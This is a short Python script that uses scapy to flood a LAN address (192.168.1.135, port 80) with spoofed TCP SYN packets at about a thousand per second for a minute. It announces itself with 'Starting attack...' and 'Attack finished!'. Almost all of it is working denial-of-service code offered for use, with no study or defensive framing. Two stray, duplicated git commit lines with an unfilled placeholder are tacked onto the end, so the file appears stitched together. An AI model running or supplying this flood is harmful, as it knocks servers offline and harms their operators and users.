import time
import random
from scapy.all import IP, TCP, send

target_ip = "192.168.1.135"
target_port = 80

atack_duration = 60

packet_rate = 1000

packet_size = 64

def create_packet():
    src_ip = f"192.168.1.{random.randint(1, 254)}"
    src_port = random.randint(1024, 65535)
    packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
    return packet

print("Starting attack...")
start_time = time.time()
while time.time() - start_time < atack_duration:
    for _ in range(packet_rate):
        packet = create_packet()
        send(packet, verbose=False)
    time.sleep(1)
print("Attack finished!")
git commit -m "{commit_message}" && git push
git commit -m "{commit_message}" && git push